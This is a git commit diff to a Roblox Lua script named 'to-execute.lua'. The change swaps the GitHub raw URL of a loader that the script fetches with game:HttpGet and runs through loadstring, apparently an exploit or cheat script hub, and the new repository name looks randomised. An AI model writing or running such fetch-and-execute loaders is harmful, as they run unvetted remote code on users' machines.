0b5096ac76cbc2c61235f8f7a9b1c8d66fd51c8d
sdffsdfdssfdfsdsdf <147963347+sdffsdfdssfdfsdsdf@users.noreply.github.com>
2024-11-27 20:58:15 -0500

    Update to-execute.lua

--- to-execute.lua
+++ to-execute.lua
@@ -1,2 +1,2 @@
 _G.Key = "test"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Sphereuz/Lucid.lua/refs/heads/main/Loader"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/546godly-pubert654/6H97UF8jVGz-main-Ki79UY76g/refs/heads/main/loader"))()
